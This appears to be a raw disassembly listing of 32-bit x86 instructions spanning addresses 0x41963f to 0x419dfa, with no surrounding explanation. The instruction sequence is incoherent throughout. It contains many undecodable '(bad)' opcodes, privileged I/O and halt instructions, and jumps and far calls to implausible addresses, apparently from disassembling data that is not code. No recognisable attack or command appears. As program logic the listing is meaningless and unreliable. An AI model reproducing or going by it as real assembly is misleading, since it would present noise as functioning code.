  41963f:	push   0xfffffff9
  419641:	sti    
  419642:	mov    edi,0xd3e743a8
  419647:	adc    edx,0x27e03423
  41964d:	popf   
  41964e:	and    al,0x1f
  419650:	inc    esi
  419651:	cmp    al,0x8f
  419653:	mov    bh,0x4e
  419655:	(bad)  
  419656:	test   al,0x1
  419658:	aam    0x83
  41965a:	xor    al,0x4f
  41965c:	lea    esi,[eax]
  41965e:	xchg   ecx,eax
  41965f:	sahf   
  419660:	jne    0x419618
  419662:	fs inc ebp
  419664:	in     eax,dx
  419665:	inc    ebp
  419666:	pop    eax
  419667:	pop    esp
  419668:	sbb    edx,DWORD PTR [edi-0x76]
  41966b:	out    0x34,al
  41966d:	mov    ds:0xf3741a25,eax
  419672:	pop    esp
  419673:	sub    ecx,ebp
  419675:	(bad)  [edi-0x21]
  419678:	or     dh,ah
  41967a:	addr16 bnd jne 0x419626
  41967e:	loope  0x41966d
  419680:	xchg   edx,esp
  419682:	jle    0x419652
  419684:	jecxz  0x41965c
  419686:	dec    esi
  419687:	and    al,BYTE PTR [edi+0x210d356e]
  41968d:	pop    ds
  41968e:	fistp  DWORD PTR [esi-0x29]
  419691:	cdq    
  419692:	xchg   ecx,eax
  419693:	ss out dx,al
  419695:	fild   QWORD PTR [edi+0x22]
  419698:	fsub   DWORD PTR [edx+ebx*8]
  41969b:	pop    esp
  41969c:	cmp    edx,DWORD PTR [edx]
  41969e:	pusha  
  41969f:	push   ss
  4196a0:	add    al,0x45
  4196a2:	cmp    eax,0xe80836f8
  4196a7:	shr    DWORD PTR [eax+0x1a],cl
  4196aa:	cmp    DWORD PTR [edx],esp
  4196ac:	out    dx,al
  4196ad:	or     BYTE PTR [ecx-0x11],0xcb
  4196b1:	or     al,0xd7
  4196b3:	xor    al,ch
  4196b5:	imul   ebp,edx,0xffffffc6
  4196b8:	adc    BYTE PTR [eax],ah
  4196ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196bb:	icebp  
  4196bc:	xchg   esi,eax
  4196bd:	lock inc eax
  4196bf:	je     0x419707
  4196c1:	rcr    BYTE PTR [esi],0x8f
  4196c4:	imul   ebx,DWORD PTR [edi-0x6a],0x46
  4196c8:	ret    
  4196c9:	lods   eax,DWORD PTR ds:[esi]
  4196ca:	adc    al,0x7c
  4196cc:	push   cs
  4196cd:	scas   eax,DWORD PTR es:[edi]
  4196ce:	cmp    DWORD PTR ds:0x9950e673,eax
  4196d4:	or     DWORD PTR [ebx-0x2734327],esi
  4196da:	div    DWORD PTR [ebx]
  4196dc:	mov    ebx,0x5e3c6986
  4196e1:	and    BYTE PTR [edx+0x13],dh
  4196e4:	sbb    edx,ecx
  4196e6:	adc    al,0xf3
  4196e8:	jno    0x419693
  4196ea:	je     0x41974b
  4196ec:	add    eax,0x2ea6521d
  4196f1:	pop    edi
  4196f2:	mov    ds:0xbb25804a,al
  4196f7:	jp     0x419729
  4196f9:	loope  0x41971f
  4196fb:	cli    
  4196fc:	xlat   BYTE PTR ds:[ebx]
  4196fd:	jp     0x4196fe
  4196ff:	(bad)  
  419700:	call   0x272686b5
  419705:	repz call 0x4014ebc5
  41970b:	loop   0x41975f
  41970d:	addr16 mov dl,0x3c
  419710:	jle    0x4196b8
  419712:	(bad)  
  419713:	sbb    DWORD PTR [ecx-0x1e63ec4a],ebp
  419719:	mov    dl,0xd8
  41971b:	shl    BYTE PTR ds:0xcb000ae3,0xd
  419722:	(bad)  
  419723:	js     0x41970f
  419725:	fwait
  419726:	stc    
  419727:	xor    ah,BYTE PTR [edi]
  419729:	loope  0x419749
  41972b:	jbe    0x4196c7
  41972d:	mov    WORD PTR [eax-0x585903a0],?
  419733:	jmp    0x4196f5
  419735:	jp     0x41972c
  419737:	les    esp,FWORD PTR [ecx-0x71]
  41973a:	push   es
  41973b:	ss pop esi
  41973d:	or     al,BYTE PTR [ebp+0x33]
  419740:	aas    
  419741:	mov    ds,WORD PTR [ebx]
  419743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419744:	outs   dx,BYTE PTR ds:[esi]
  419745:	lock sbb esp,DWORD PTR [esi-0x330e9476]
  41974c:	ret    0x5814
  41974f:	push   edx
  419750:	cli    
  419751:	daa    
  419752:	(bad)  
  419754:	mov    ds:0xddaa2234,al
  419759:	mov    ds:0x45c95444,al
  41975e:	jb     0x419702
  419760:	mov    dh,ah
  419762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419763:	xchg   edi,eax
  419764:	jo     0x4197e2
  419766:	dec    edx
  419767:	out    dx,al
  419768:	cdq    
  419769:	cs sahf 
  41976b:	xor    edx,ecx
  41976d:	jne    0x41973d
  41976f:	iret   
  419770:	pop    es
  419771:	je     0x419763
  419773:	xor    ah,0x32
  419776:	or     ah,bl
  419778:	cmp    ebp,esp
  41977a:	popf   
  41977b:	mov    DWORD PTR [edx+0x3dab879d],ecx
  419781:	push   esp
  419782:	mov    esi,es
  419784:	jl     0x4197af
  419786:	dec    edi
  419787:	fst    QWORD PTR [edx-0x169d665b]
  41978d:	inc    ebx
  41978e:	out    0x79,al
  419790:	or     al,0x98
  419792:	sbb    eax,ecx
  419794:	js     0x419806
  419796:	(bad)  
  419797:	retf   
  419798:	hlt    
  419799:	mov    edi,0xddaacb10
  41979e:	(bad)  [eax]
  4197a0:	cmp    DWORD PTR [ebx+ebp*4],esi
  4197a3:	in     eax,dx
  4197a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197a5:	pop    edi
  4197a6:	and    eax,0xdc6157db
  4197ab:	cld    
  4197ac:	pop    es
  4197ad:	imul   edi,DWORD PTR [ecx+0x5005cf77],0x70e3f608
  4197b7:	jb     0x419752
  4197b9:	fs jg  0x4197e3
  4197bc:	mov    ah,0x65
  4197be:	mov    ebp,0x986f4968
  4197c3:	(bad)  
  4197c4:	lods   eax,DWORD PTR ds:[esi]
  4197c5:	adc    BYTE PTR [edx+0x82078b7],dl
  4197cb:	and    al,0xc6
  4197cd:	and    DWORD PTR [edi-0x77712c7d],0xffffff99
  4197d4:	rcl    edi,1
  4197d6:	out    dx,eax
  4197d7:	and    al,0x5d
  4197d9:	or     DWORD PTR [eax],edi
  4197db:	mov    bh,0x33
  4197dd:	pop    eax
  4197de:	push   es
  4197df:	(bad)  
  4197e0:	call   0xaa71e60c
  4197e5:	cmp    eax,DWORD PTR [edi]
  4197e7:	cmc    
  4197e8:	sub    DWORD PTR [ecx+0x60],ebp
  4197eb:	jmp    0xb70c:0x6866c517
  4197f2:	scas   eax,DWORD PTR es:[edi]
  4197f3:	mov    al,0xaf
  4197f5:	pop    ecx
  4197f6:	dec    eax
  4197f7:	mul    BYTE PTR [ecx]
  4197f9:	outs   dx,BYTE PTR ds:[esi]
  4197fa:	mov    dh,0xfe
  4197fc:	cmp    eax,0x3921155f
  419801:	or     cl,BYTE PTR [ebx]
  419803:	lods   eax,DWORD PTR ds:[esi]
  419804:	mov    dh,BYTE PTR [ecx+0x113c5bd6]
  41980a:	or     edi,DWORD PTR fs:[ebx+edx*2+0x6f]
  41980f:	push   ebp
  419810:	mov    ebp,0x1571f96f
  419815:	push   esp
  419816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419817:	jno    0x4197d0
  419819:	lods   al,BYTE PTR ds:[esi]
  41981a:	or     eax,0x37624356
  41981f:	aaa    
  419820:	sub    esi,DWORD PTR [ebx-0x10]
  419823:	repnz pusha 
  419825:	sub    al,0x4e
  419827:	and    BYTE PTR [ecx-0x73125aa6],bh
  41982d:	cmp    BYTE PTR [ebx-0x5d],0xc1
  419831:	into   
  419832:	retf   
  419833:	and    eax,0xbca785ba
  419838:	jmp    0x4197ea
  41983a:	inc    ecx
  41983b:	sub    ch,BYTE PTR [ecx]
  41983d:	test   DWORD PTR [edi+0x6e],0xa29dd3ad
  419844:	xor    bl,bh
  419846:	push   ebx
  419847:	test   cl,dl
  419849:	sbb    edx,DWORD PTR [edi-0x2918c61d]
  41984f:	xor    BYTE PTR [edx+0x19d78a9e],dl
  419855:	cld    
  419856:	loop   0x41983b
  419858:	dec    esi
  419859:	jne    0x4197fd
  41985b:	xchg   edx,eax
  41985c:	ret    
  41985d:	jl     0x4197ef
  41985f:	sub    bl,bl
  419861:	xchg   DWORD PTR [ebx+0x33f603d9],ecx
  419867:	icebp  
  419868:	cs jmp 0x419810
  41986b:	or     al,0x94
  41986e:	jmp    0x419809
  419870:	shr    BYTE PTR gs:[eax-0x32],1
  419874:	(bad)  
  419875:	in     eax,dx
  419876:	adc    eax,0x678c2a60
  41987b:	pop    eax
  41987c:	add    eax,0x42c400e6
  419881:	push   edx
  419882:	pop    eax
  419883:	or     BYTE PTR [ecx],bh
  419885:	daa    
  419886:	sub    eax,0x90040ddb
  41988b:	dec    ebx
  41988c:	jo     0x4198c9
  41988e:	pop    eax
  41988f:	sub    eax,0xe72ec592
  419894:	call   0xb4d3e8ec
  419899:	(bad)  
  41989a:	ins    DWORD PTR es:[edi],dx
  41989b:	loopne 0x41986a
  41989d:	xchg   esi,eax
  41989e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41989f:	jne    0x419911
  4198a1:	fild   QWORD PTR [eax+0xdb84482]
  4198a7:	push   DWORD PTR [ebx-0xf]
  4198aa:	mov    al,0x0
  4198ac:	push   0xfffffff1
  4198ae:	mov    bl,cl
  4198b0:	dec    eax
  4198b1:	fldenv [ebp+edi*8-0x13694535]
  4198b8:	ins    DWORD PTR es:[edi],dx
  4198b9:	pop    ebp
  4198ba:	mov    esi,0xf7e5f2e7
  4198bf:	pushf  
  4198c0:	and    al,BYTE PTR [esi]
  4198c2:	xchg   ebp,eax
  4198c3:	scas   eax,DWORD PTR es:[edi]
  4198c4:	mov    dl,0xc2
  4198c6:	mov    WORD PTR [ebx],?
  4198c8:	shr    BYTE PTR [edx-0x62f8e0d1],cl
  4198ce:	test   BYTE PTR [eax-0x2b956196],al
  4198d4:	xchg   edx,eax
  4198d5:	adc    edi,esi
  4198d7:	adc    bh,BYTE PTR [edx+0x57]
  4198da:	loopne 0x4198e5
  4198dc:	cmp    DWORD PTR [ecx+eiz*1],ecx
  4198df:	mov    al,0xdf
  4198e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198e2:	sub    bh,ch
  4198e4:	shr    bh,1
  4198e6:	cmp    al,BYTE PTR ds:0xa9005c35
  4198ec:	cld    
  4198ed:	and    BYTE PTR [edi],ch
  4198ef:	fisttp QWORD PTR [eax+0x771ba8f0]
  4198f5:	je     0x419959
  4198f7:	xchg   esi,eax
  4198f8:	xchg   bl,bh
  4198fa:	out    0xfb,al
  4198fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198fd:	rol    edx,1
  4198ff:	sbb    DWORD PTR [edx-0x2f],ecx
  419902:	(bad)  
  419903:	and    al,BYTE PTR [ebp-0x2368733f]
  419909:	mov    cl,0x80
  41990b:	sub    BYTE PTR [ecx+0x56bf4bf6],dh
  419911:	sbb    al,0x85
  419913:	mov    ebx,DWORD PTR [ebp-0x78]
  419916:	xor    eax,0x4b20242f
  41991b:	add    al,0x65
  41991d:	push   0x1
  41991f:	loop   0x4198d4
  419921:	sub    esi,ebp
  419923:	dec    ebx
  419924:	xchg   BYTE PTR [edi],al
  419926:	std    
  419927:	mov    edx,0xa9dc28ec
  41992c:	push   es
  41992d:	mov    ah,0xe3
  41992f:	push   0xe886ec4d
  419934:	int    0x66
  419936:	cmp    al,0x48
  419938:	call   FWORD PTR [esi-0x14]
  41993b:	test   eax,0x3261ad72
  419940:	mov    ds:0xd39745aa,al
  419945:	sub    eax,0x49de3243
  41994a:	(bad)  
  41994b:	or     al,0xff
  41994d:	rcl    BYTE PTR [esi],cl
  41994f:	fs fwait
  419951:	in     al,0xad
  419953:	mov    ds,WORD PTR [ecx-0x6d4687df]
  419959:	mov    si,0x8e26
  41995d:	sbb    BYTE PTR [eax],ah
  41995f:	adc    BYTE PTR [eax],dh
  419961:	dec    eax
  419962:	sar    DWORD PTR [ecx],0xd0
  419965:	push   eax
  419966:	or     al,0x5d
  419968:	add    al,0x37
  41996a:	push   cs
  41996b:	xlat   BYTE PTR ds:[ebx]
  41996c:	lahf   
  41996d:	ret    0x4bf9
  419970:	mov    ss,WORD PTR [ebx+0x1c53d4ef]
  419976:	test   al,0x51
  419978:	cmp    DWORD PTR ds:0x342918b0,ebx
  41997e:	dec    esp
  41997f:	sbb    eax,0xc50a7758
  419984:	mov    ebx,0xcb6aad8a
  419989:	inc    eax
  41998a:	pusha  
  41998b:	add    al,0x7e
  41998d:	mov    esp,0x78734cd5
  419992:	sub    bh,al
  419994:	into   
  419995:	leave  
  419996:	fcomi  st,st(2)
  419998:	retf   
  419999:	jae    0x41998f
  41999b:	push   es
  41999c:	pop    ss
  41999d:	sbb    al,0x55
  41999f:	gs gs (bad) 
  4199a2:	call   0x14025525
  4199a7:	jmp    0x17d1:0x731fdc14
  4199ae:	pop    ebp
  4199af:	dec    ebp
  4199b0:	xchg   edi,eax
  4199b1:	mul    edx
  4199b3:	in     al,dx
  4199b4:	in     al,dx
  4199b5:	xchg   edx,eax
  4199b6:	enter  0xd256,0xb4
  4199ba:	xor    cl,0xdc
  4199bd:	jmp    0xacdafbd7
  4199c2:	pushf  
  4199c3:	or     esp,DWORD PTR ss:[edi+eax*2+0x7f607203]
  4199cb:	cmp    al,0x81
  4199cd:	(bad)  
  4199ce:	xlat   BYTE PTR ds:[ebx]
  4199cf:	sbb    DWORD PTR [eax+0x48f6034c],edx
  4199d5:	xor    al,0x7b
  4199d7:	xor    BYTE PTR [eax+eax*8],0xc0
  4199db:	add    al,0x29
  4199dd:	test   BYTE PTR [edi*8-0x73a4d3a6],al
  4199e4:	mov    esi,0xeaf71e7b
  4199e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199ea:	sbb    ebx,DWORD PTR [edi]
  4199ec:	clc    
  4199ed:	nop
  4199ee:	push   cs
  4199ef:	lods   al,BYTE PTR ds:[esi]
  4199f0:	dec    edx
  4199f1:	jmp    0x41997a
  4199f3:	push   ebx
  4199f4:	jb     0x4199a1
  4199f6:	or     dl,dl
  4199f8:	jg     0x419a51
  4199fa:	lods   al,BYTE PTR ds:[esi]
  4199fb:	in     al,0x95
  4199fd:	mov    bh,0x29
  4199ff:	mov    esp,0x5a2c1431
  419a04:	mov    edx,0x49861a8a
  419a09:	push   ebp
  419a0a:	aaa    
  419a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a0c:	(bad)  
  419a0d:	xchg   esp,eax
  419a0e:	arpl   dx,ax
  419a10:	and    eax,0x4e3a6bcf
  419a15:	popf   
  419a16:	push   0x0
  419a18:	xor    DWORD PTR [edx+ecx*4],ecx
  419a1b:	lock call 0x3957:0xfd2ae01
  419a23:	loope  0x419a6c
  419a25:	cmp    ch,dl
  419a27:	inc    esi
  419a28:	mov    ebp,0x6f60c01d
  419a2d:	ss in  eax,dx
  419a2f:	xor    al,0xd2
  419a31:	cmp    esi,esi
  419a33:	push   es
  419a34:	sub    eax,0x783a6ac0
  419a39:	dec    ebx
  419a3a:	and    DWORD PTR [eax-0x6d238acf],0xdb314a46
  419a44:	(bad)  
  419a45:	iret   
  419a46:	xor    DWORD PTR [edx],ebp
  419a48:	jmp    0x5b1a:0xbd653b74
  419a4f:	push   0xffffffb2
  419a51:	mov    ds:0x4e4f5139,eax
  419a56:	scas   al,BYTE PTR es:[edi]
  419a57:	ds hlt 
  419a59:	ins    BYTE PTR es:[edi],dx
  419a5a:	lock cmp eax,0x628cd6fe
  419a60:	std    
  419a61:	or     BYTE PTR [ebp-0x17eb72f0],dh
  419a67:	dec    ebx
  419a68:	or     eax,0x45a61dc
  419a6d:	push   ecx
  419a6e:	je     0x419a31
  419a70:	fwait
  419a71:	stos   BYTE PTR es:[edi],al
  419a72:	sbb    eax,0xc4188a76
  419a77:	out    0xd0,eax
  419a79:	fbld   TBYTE PTR [esp+ebx*8+0x6a7278a0]
  419a80:	aaa    
  419a81:	test   eax,0x6648ed04
  419a86:	aad    0xd0
  419a88:	sub    esp,edi
  419a8a:	out    dx,al
  419a8b:	lock ja 0x419a6c
  419a8e:	and    al,cl
  419a90:	dec    edx
  419a91:	sbb    ecx,eax
  419a93:	xchg   esi,eax
  419a94:	dec    edx
  419a95:	jmp    0x419a4e
  419a97:	gs stos DWORD PTR es:[edi],eax
  419a99:	or     eax,0xba0a379c
  419a9e:	in     eax,dx
  419a9f:	call   FWORD PTR [ebx]
  419aa1:	in     eax,0x27
  419aa3:	push   0x76a2026e
  419aa8:	push   ecx
  419aa9:	push   cs
  419aaa:	push   ecx
  419aab:	xchg   esi,eax
  419aac:	jmp    0x419aa3
  419aae:	or     al,0xca
  419ab0:	inc    eax
  419ab1:	pop    ds
  419ab2:	lods   eax,DWORD PTR ds:[esi]
  419ab3:	fld    QWORD PTR [edi+0x5a5f25af]
  419ab9:	gs xchg esi,eax
  419abb:	int3   
  419abc:	iret   
  419abd:	push   ebx
  419abe:	jnp    0x419a4a
  419ac0:	clc    
  419ac1:	ret    
  419ac2:	lods   al,BYTE PTR ss:[esi]
  419ac4:	clc    
  419ac5:	cmp    eax,0x8c6aee9e
  419aca:	mov    eax,0x5dd4fac8
  419acf:	fdivr  DWORD PTR [ebx-0x180f4a78]
  419ad5:	add    al,0xaa
  419ad7:	xor    dh,BYTE PTR [edi]
  419ad9:	xchg   ebp,eax
  419ada:	imul   eax,DWORD PTR [esi],0x8c8ef814
  419ae0:	(bad)  
  419ae1:	sbb    DWORD PTR [ebp-0x4d014c84],edi
  419ae7:	inc    eax
  419ae8:	jae    0x419b3e
  419aea:	sbb    al,0x48
  419aec:	inc    ecx
  419aed:	sub    eax,0x471a999c
  419af2:	loopne 0x419ac0
  419af4:	push   ss
  419af5:	pop    ebp
  419af6:	mov    edx,0x32a396c6
  419afb:	fsub   st,st(4)
  419afd:	sbb    DWORD PTR [ebx+0x347bdf3c],ebp
  419b03:	sbb    al,BYTE PTR [eax]
  419b05:	push   esp
  419b06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b07:	outs   dx,DWORD PTR ds:[esi]
  419b08:	jo     0x419b59
  419b0a:	pop    eax
  419b0b:	imul   ebx,DWORD PTR [eax+ebp*8+0x3b],0xb031b089
  419b13:	or     DWORD PTR [eax+0x54],ebx
  419b16:	dec    esi
  419b17:	setno  BYTE PTR [edx+ebx*1-0x11]
  419b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b1d:	dec    ebp
  419b1e:	jmp    0x941eb5f0
  419b23:	xchg   BYTE PTR [ebx],dh
  419b25:	in     al,dx
  419b26:	pop    ebx
  419b27:	cwde   
  419b28:	pop    edx
  419b29:	in     eax,0x55
  419b2b:	push   0x768d6dd
  419b30:	or     al,0x13
  419b32:	fcmovnb st,st(1)
  419b34:	shl    BYTE PTR [esi+0x62],0xa5
  419b38:	aam    0x4a
  419b3a:	into   
  419b3b:	jno    0x419b41
  419b3d:	mov    esi,DWORD PTR ds:0x7ae7b0da
  419b43:	lods   al,BYTE PTR ds:[esi]
  419b44:	and    al,0x39
  419b46:	xlat   BYTE PTR ds:[ebx]
  419b47:	dec    edx
  419b48:	cwde   
  419b49:	fild   WORD PTR [ebx]
  419b4b:	cmp    bl,BYTE PTR [edi+0x3d]
  419b4e:	push   esi
  419b4f:	cmp    DWORD PTR [esi+0x20],edi
  419b52:	in     eax,0xda
  419b54:	icebp  
  419b55:	(bad)  
  419b56:	ins    DWORD PTR es:[edi],dx
  419b57:	dec    esp
  419b58:	pop    ds
  419b59:	neg    al
  419b5b:	mov    gs,WORD PTR [esi+0x4648614d]
  419b61:	or     DWORD PTR [edi-0x20],esi
  419b64:	lea    ebp,[ebp+0x254d3c66]
  419b6a:	(bad)  [edx+0x36ae9404]
  419b70:	outs   dx,BYTE PTR ds:[esi]
  419b71:	pop    ds
  419b72:	cmp    bh,cl
  419b74:	xchg   DWORD PTR [eax+0x1a],ebp
  419b77:	mov    ebx,0x24ea9747
  419b7c:	cmp    edx,ecx
  419b7e:	mov    dl,0x68
  419b80:	sub    ch,dl
  419b82:	js     0x419b40
  419b84:	(bad)  
  419b85:	xchg   edx,eax
  419b86:	mov    edi,0x24927d87
  419b8b:	leave  
  419b8c:	jns    0x419b19
  419b8e:	mov    ebp,0x3433a2f3
  419b93:	popf   
  419b94:	icebp  
  419b95:	dec    eax
  419b96:	data16 sbb BYTE PTR [ecx],dl
  419b99:	xor    DWORD PTR [eax],ebp
  419b9b:	xor    al,0x7
  419b9d:	ret    
  419b9e:	sbb    dh,ch
  419ba0:	adc    al,0x14
  419ba2:	into   
  419ba3:	cwde   
  419ba4:	xchg   ebp,eax
  419ba5:	xchg   edx,eax
  419ba6:	sbb    DWORD PTR [ebp-0x16b8d6d0],ecx
  419bac:	jne    0x419bc8
  419bae:	fisubr WORD PTR [ebx-0x563f28ac]
  419bb4:	sti    
  419bb5:	daa    
  419bb6:	push   esp
  419bb7:	daa    
  419bb8:	add    edi,DWORD PTR [eax+0x4f600ed8]
  419bbe:	adc    eax,0x1ff5c3aa
  419bc3:	outs   dx,DWORD PTR ds:[esi]
  419bc4:	inc    ecx
  419bc5:	mov    al,ds:0x3305d4f1
  419bca:	jp     0x419c0e
  419bcc:	lahf   
  419bcd:	mov    ch,dl
  419bcf:	fwait
  419bd0:	push   cs
  419bd1:	sub    esi,DWORD PTR [ebx-0x67867d51]
  419bd7:	outs   dx,DWORD PTR ds:[esi]
  419bd8:	neg    edx
  419bda:	cmp    eax,DWORD PTR [ecx+0x59251bdb]
  419be0:	adc    eax,0x47585d03
  419be5:	lock js 0x419c60
  419be8:	ret    
  419be9:	dec    edi
  419bea:	mov    ds:0x8940cdfa,eax
  419bef:	jle    0x419c22
  419bf1:	hlt    
  419bf2:	dec    ebx
  419bf3:	fist   WORD PTR [ebx+ecx*8-0x5ccf367a]
  419bfa:	cli    
  419bfb:	retf   0x5038
  419bfe:	push   esi
  419bff:	cld    
  419c00:	xchg   BYTE PTR [ebp+edx*8-0x5f8f6fdb],ch
  419c07:	ins    BYTE PTR es:[edi],dx
  419c08:	add    DWORD PTR [esi-0x15],ebp
  419c0b:	inc    edx
  419c0c:	test   BYTE PTR ds:0xd7b07810,al
  419c12:	retf   0xac80
  419c15:	ja     0x419c74
  419c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c18:	repz mov esp,0x114b610d
  419c1e:	dec    esp
  419c1f:	sub    ebp,DWORD PTR [edi+0x54b7bae]
  419c25:	adc    al,0xc1
  419c27:	(bad)  
  419c28:	clc    
  419c29:	retf   0x564b
  419c2c:	xchg   esp,eax
  419c2d:	mov    al,ds:0x1d209450
  419c32:	call   0x4aa6:0x78030460
  419c39:	ins    BYTE PTR es:[edi],dx
  419c3a:	mov    al,ds:0xe6dffe62
  419c3f:	pop    esp
  419c40:	pop    eax
  419c41:	cmp    DWORD PTR ds:0x12559aa8,esp
  419c47:	mov    dl,0xe1
  419c49:	lods   eax,DWORD PTR gs:[esi]
  419c4b:	lea    edx,[edx-0x4c2bcb25]
  419c51:	nop
  419c52:	lahf   
  419c53:	jnp    0x419c89
  419c55:	repz pop edi
  419c57:	push   0xffffff9c
  419c59:	mov    dl,0x2
  419c5b:	adc    ch,BYTE PTR [edi+0x35]
  419c5e:	cmp    DWORD PTR [esp+esi*8-0x59],esp
  419c62:	cmp    esp,DWORD PTR [edi+0x3d90b334]
  419c68:	mov    eax,0x4fe98a6f
  419c6d:	in     eax,dx
  419c6e:	js     0x419c6b
  419c70:	xor    DWORD PTR [ecx],edi
  419c72:	add    eax,0xa6772a9a
  419c77:	in     eax,dx
  419c78:	mov    ebp,0xb6efbf0a
  419c7d:	xor    cl,BYTE PTR [edi-0x7c]
  419c80:	mov    bh,0xe0
  419c82:	mov    edx,0x93e33f21
  419c87:	push   0x3b
  419c89:	pop    ebx
  419c8a:	mov    eax,esi
  419c8c:	xor    dl,bl
  419c8e:	pop    esp
  419c8f:	fsub   DWORD PTR [eax-0x90c8bfd]
  419c95:	outs   dx,BYTE PTR ds:[esi]
  419c96:	jecxz  0x419c8b
  419c98:	retf   
  419c99:	dec    eax
  419c9a:	data16 sub al,BYTE PTR [esi+0x56385518]
  419ca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ca2:	cli    
  419ca3:	sbb    ebp,DWORD PTR [eax]
  419ca5:	lods   al,BYTE PTR ds:[esi]
  419ca6:	sahf   
  419ca7:	dec    ebx
  419ca8:	pop    ebx
  419ca9:	ret    0x69fc
  419cac:	mov    dl,0xa5
  419cae:	ret    
  419caf:	jg     0x419cf7
  419cb1:	xchg   ecx,eax
  419cb2:	nop
  419cb3:	add    ecx,DWORD PTR [eax]
  419cb5:	aad    0xe8
  419cb7:	xor    DWORD PTR [eax],esi
  419cb9:	sbb    al,BYTE PTR [esi+eiz*2-0x674c434e]
  419cc0:	rcr    ebx,0xb
  419cc3:	and    ah,BYTE PTR [ebp-0x75127688]
  419cc9:	test   al,0x77
  419ccb:	jmp    0x419cb0
  419ccd:	daa    
  419cce:	cmp    DWORD PTR [edx],eax
  419cd0:	inc    esi
  419cd1:	jg     0x419d47
  419cd3:	cmp    al,0x15
  419cd5:	sar    BYTE PTR ds:0xaaf683e9,cl
  419cdb:	loope  0x419d01
  419cdd:	enter  0x5ec8,0x70
  419ce1:	mov    dh,BYTE PTR [eax]
  419ce3:	cmc    
  419ce4:	xchg   esp,eax
  419ce5:	fadd   DWORD PTR [ecx+0x75]
  419ce8:	mov    WORD PTR [edx-0x73],fs
  419ceb:	xchg   DWORD PTR [esi+ebp*4+0xe983feb],ebp
  419cf2:	or     eax,0x19673bb9
  419cf7:	pop    eax
  419cf8:	js     0x419d46
  419cfa:	mov    ds:0x902f19cb,eax
  419cff:	jns    0x419d2b
  419d01:	xor    DWORD PTR [eax+0x70],ebp
  419d04:	fcom   DWORD PTR [eax]
  419d06:	test   DWORD PTR [esi-0xf],edx
  419d09:	jmp    0xbfcc3fc4
  419d0e:	xchg   ebx,eax
  419d0f:	and    eax,DWORD PTR [eax+0x73]
  419d12:	sub    al,0x15
  419d14:	fld    DWORD PTR [ebx]
  419d16:	push   esi
  419d17:	mov    al,ds:0xf03b4df2
  419d1c:	dec    edi
  419d1d:	pop    esp
  419d1e:	inc    esp
  419d1f:	call   FWORD PTR [eax+0x64f089e1]
  419d25:	cmp    DWORD PTR [ebp-0x56f9580c],eax
  419d2b:	xor    DWORD PTR [ecx+0x6f45e654],edi
  419d31:	dec    edi
  419d32:	ret    
  419d33:	lea    ebp,[ebx+0x4e]
  419d36:	pusha  
  419d37:	in     al,dx
  419d38:	pop    ebx
  419d39:	stos   DWORD PTR es:[edi],eax
  419d3a:	mov    eax,0xe81e0dbe
  419d3f:	cmp    edi,DWORD PTR [ecx+0x32]
  419d42:	(bad)  
  419d43:	pop    esi
  419d44:	in     eax,0xdf
  419d46:	sbb    DWORD PTR [esi],edx
  419d48:	jl     0x419d4a
  419d4a:	fisubr WORD PTR [ecx]
  419d4c:	fcom   DWORD PTR [esp+ebx*2-0x1a23efb7]
  419d53:	sar    BYTE PTR [edi+0x4a],1
  419d56:	das    
  419d57:	adc    al,0x2e
  419d59:	sub    DWORD PTR [ecx-0x7c],edx
  419d5c:	test   eax,0xb84b2551
  419d62:	ja     0x419d0d
  419d64:	mov    ds:0x4a7fd0b4,eax
  419d69:	and    ebx,ebx
  419d6b:	add    eax,0x7d3c92d1
  419d70:	push   0xe1258d45
  419d75:	push   ebp
  419d76:	fmul   DWORD PTR [eax]
  419d78:	aaa    
  419d79:	adc    bh,BYTE PTR [edx+0x14]
  419d7c:	jmp    0x5747:0x982f194d
  419d83:	jae    0x419dcc
  419d85:	inc    ecx
  419d86:	jns    0x419e07
  419d88:	ret    0x2051
  419d8b:	lahf   
  419d8c:	or     eax,0x52a2deca
  419d91:	and    BYTE PTR [esi-0x2b],0x0
  419d95:	adc    al,0x66
  419d97:	and    ecx,DWORD PTR [esi+0x428f7494]
  419d9d:	das    
  419d9e:	or     eax,0x90b0ac00
  419da3:	sub    bh,dh
  419da5:	fld    QWORD PTR [edi]
  419da7:	jb     0x419d59
  419da9:	in     al,dx
  419daa:	adc    BYTE PTR [ecx+edx*1],dl
  419dad:	mov    ebp,0xbf9fe390
  419db2:	dec    ebp
  419db3:	or     al,0xe5
  419db5:	mov    dh,0x56
  419db7:	fcomp  QWORD PTR [eax-0x23ff2172]
  419dbd:	dec    eax
  419dbe:	neg    DWORD PTR [eax+0x13]
  419dc1:	add    al,BYTE PTR [edx]
  419dc3:	inc    esi
  419dc4:	inc    ebp
  419dc5:	dec    eax
  419dc6:	push   ecx
  419dc7:	cmp    ecx,edi
  419dc9:	sti    
  419dca:	or     edi,edx
  419dcc:	icebp  
  419dcd:	xchg   esi,eax
  419dce:	test   BYTE PTR [edx+0x64b29409],al
  419dd4:	(bad)  
  419dd5:	jmp    edx
  419dd7:	xchg   edi,eax
  419dd8:	sub    esi,ebp
  419dda:	xchg   DWORD PTR [ecx],eax
  419ddc:	(bad)  
  419ddd:	pop    edi
  419dde:	mov    ebx,ecx
  419de0:	adc    BYTE PTR [esi],cl
  419de2:	or     al,BYTE PTR [ecx-0x73]
  419de5:	jp     0x419d6f
  419de7:	adc    cl,BYTE PTR [esi-0x70ae218a]
  419ded:	adc    bl,BYTE PTR [eax-0x1]
  419df0:	or     al,0xed
  419df2:	or     dl,BYTE PTR cs:[edi]
  419df5:	dec    ecx
  419df6:	into   
  419df7:	or     al,0x99
  419df9:	xchg   ebp,eax
  419dfa:	push   0xfffffffc
